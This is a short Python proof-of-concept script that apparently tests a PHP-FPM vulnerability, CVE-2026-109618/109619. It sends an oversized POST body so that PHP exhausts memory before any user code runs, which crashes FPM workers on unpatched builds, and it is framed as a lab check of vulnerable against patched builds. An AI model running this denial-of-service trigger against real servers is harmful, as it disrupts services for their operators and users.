#!/usr/bin/env python3
# CVE-2026-109618/109619 core: OOM during request startup. Sends a body larger
# than memory_limit; PHP OOMs while reading it, before any user code runs. On a
# vulnerable FPM build the worker exits abnormally (code 70) and respawns; on a
# patched build it survives. Run against a lab target with a low memory_limit.
import argparse
import sys
import urllib.request
import urllib.error


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="e.g. http://127.0.0.1:18080/info.php")
    ap.add_argument("--mb", type=int, default=8)
    args = ap.parse_args()

    body = b"a=" + b"A" * (args.mb * 1024 * 1024)
    req = urllib.request.Request(args.url, data=body, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        r = urllib.request.urlopen(req, timeout=30)
        text = r.read().decode(errors="replace")
        print(f"  HTTP {r.status}")
    except urllib.error.HTTPError as e:
        text = e.read().decode(errors="replace")
        print(f"  HTTP {e.code}")

    if "Allowed memory size" in text and "Unknown" in text:
        print("  OOM reached in the startup window (Unknown:0):")
        for line in text.splitlines():
            if "Allowed memory size" in line:
                print("   ", line.strip())
        print("\n  Watch the FPM log for worker crashes: "
              "podman logs oomlab-fpm | grep 'exited with code'")
        return 0
    print("  no startup OOM observed:", text.strip()[:200])
    return 1


if __name__ == "__main__":
    sys.exit(main())
